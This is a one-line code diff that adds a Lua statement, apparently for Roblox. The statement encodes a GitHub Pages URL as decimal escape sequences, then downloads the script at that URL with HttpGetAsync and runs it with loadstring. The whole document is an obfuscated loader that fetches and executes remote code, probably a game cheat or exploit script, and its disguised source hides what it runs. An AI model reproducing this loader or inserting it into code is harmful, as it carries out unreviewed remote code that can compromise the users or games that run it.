@@ -1,0 +1,1 @@
+local p,e,n,i,s = "\49\55\70\55\79","\83\99\114\105\112\116\115","\79\104\105\111","\77\111\100\101\86\50","\108\117\97";loadstring(game:HttpGetAsync(("https://gamingresources.github.io/%s%s/%s%s.%s"):format(p,e,n,i,s)))()
